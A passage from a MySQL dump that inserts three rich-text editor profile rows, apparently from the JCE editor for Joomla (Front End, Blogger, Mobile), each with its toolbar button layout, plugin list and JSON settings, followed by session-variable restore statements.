(2, 'Front End', 'Sample Front-end Profile', '', '3,4,5', '', 1, 'desktop,tablet,phone', 'help,newdocument,undo,redo,spacer,bold,italic,underline,strikethrough,justifyfull,justifycenter,justifyleft,justifyright,spacer,formatselect,styleselect;clipboard,searchreplace,indent,outdent,lists,cleanup,charmap,removeformat,hr,sub,sup,textcase,nonbreaking,visualchars,visualblocks;fullscreen,preview,print,visualaid,style,xhtmlxtras,anchor,unlink,link,imgmanager,spellchecker,article', 'contextmenu,inlinepopups,help,clipboard,searchreplace,fullscreen,preview,print,style,textcase,nonbreaking,visualchars,visualblocks,xhtmlxtras,imgmanager,anchor,link,spellchecker,article,lists,charmap,formatselect,styleselect', 0, 2, 0, '0000-00-00 00:00:00', '{"lists":{"buttons":["numlist","bullist"]}}'),
(3, 'Blogger', 'Simple Blogging Profile', '', '3,4,5,6,8,7', '', 0, 'desktop,tablet,phone', 'bold,italic,strikethrough,lists,blockquote,spacer,justifyleft,justifycenter,justifyright,spacer,link,unlink,imgmanager,article,spellchecker,fullscreen,kitchensink;formatselect,underline,justifyfull,forecolor,clipboard,removeformat,charmap,indent,outdent,undo,redo,help', 'link,imgmanager,article,spellchecker,fullscreen,kitchensink,clipboard,contextmenu,inlinepopups,lists,charmap,formatselect,fontcolor', 0, 3, 0, '0000-00-00 00:00:00', '{"editor":{"toggle":"0"},"lists":{"buttons":["numlist","bullist"]}}'),
(4, 'Mobile', 'Sample Mobile Profile', '', '3,4,5,6,8,7', '', 0, 'tablet,phone', 'undo,redo,spacer,bold,italic,underline,formatselect,spacer,justifyleft,justifycenter,justifyfull,justifyright,spacer,fullscreen,kitchensink;styleselect,lists,spellchecker,article,link,unlink', 'fullscreen,kitchensink,spellchecker,article,link,inlinepopups,lists,formatselect,styleselect', 0, 4, 0, '0000-00-00 00:00:00', '{"editor":{"toolbar_theme":"mobile","resizing":"0","resize_horizontal":"0","resizing_use_cookie":"0","toggle":"0","links":{"popups":{"default":"","jcemediabox":{"enable":"0"},"window":{"enable":"0"}}}},"lists":{"buttons":["numlist","bullist"]}}');

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
